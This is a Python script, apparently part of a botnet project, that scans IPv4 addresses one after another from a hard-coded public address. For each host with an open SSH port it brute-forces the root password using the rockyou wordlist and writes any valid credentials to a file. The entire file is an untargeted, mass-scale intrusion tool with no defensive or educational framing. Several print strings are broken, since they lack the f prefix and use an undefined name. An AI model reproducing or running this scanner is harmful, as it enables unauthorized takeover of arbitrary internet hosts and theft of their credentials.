import sys
import ipaddress
import socket
import paramiko
import time



def testPortSSH(ip):
   try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(3)
      s.connect((ip, 22))
      s.shutdown(2)
      return 1
   except:
      return 0






def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print("[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print("[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print("[*] Quota exceeded, retrying with delay...{RESET}")
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("[*] Quota exceeded, retrying with delay...{RESET}")
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print("[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True





def bruteforce(ip):
    host = ip
    passlist = "/root/proc-botnet/rockyou.txt"
    user = "root"
    words = open(passlist, 'r')
    for password in words:
        print("Trying password : " + password.rstrip())
        if is_ssh_open(host, user, password):
           #if combo is valid, save it to a file
           print("Found valid creds : {user}@{host}:{password}")
           open("credentials.txt", "w").write(f"{user}@{host}:{password}")
           break




current_ip = ipaddress.IPv4Address("93.113.207.181")

while True:
   try:
      print("Analyzing IP Address : "+ str(current_ip))
      if(testPortSSH(str(current_ip))==1):
         print("Discover new open SSH port !")
         bruteforce(str(current_ip))
      current_ip = current_ip+1
   except KeyboardInterrupt:
      sys.exit()